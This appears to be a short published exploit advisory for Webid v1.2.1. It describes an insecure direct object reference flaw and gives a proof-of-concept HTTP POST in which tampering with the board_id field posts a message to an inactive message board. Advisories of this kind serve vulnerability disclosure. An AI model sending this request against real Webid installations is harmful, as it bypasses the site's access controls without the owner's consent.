# Exploit Title: Webid v1.2.1 - Insecure Direct Object Reference(IDOR)
## Date: 2/1/2024
## Vendor Homepage: https://sourceforge.net/projects/simpleauction/files/latest/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: Webid
## Version: v1.2.1
## Exploit Description:
## Webid v1.2.1 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to post a message in a board that is inactive(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /msgboard.php?board_id=3 HTTP/1.1
...

csrftoken=d9f7a01e2ac2197ab888018b2588a3ab&action=insertmessage&board_id=2(CHANGE HERE)&newmessage=hello+i+am+user2&Submit=Post+Message
```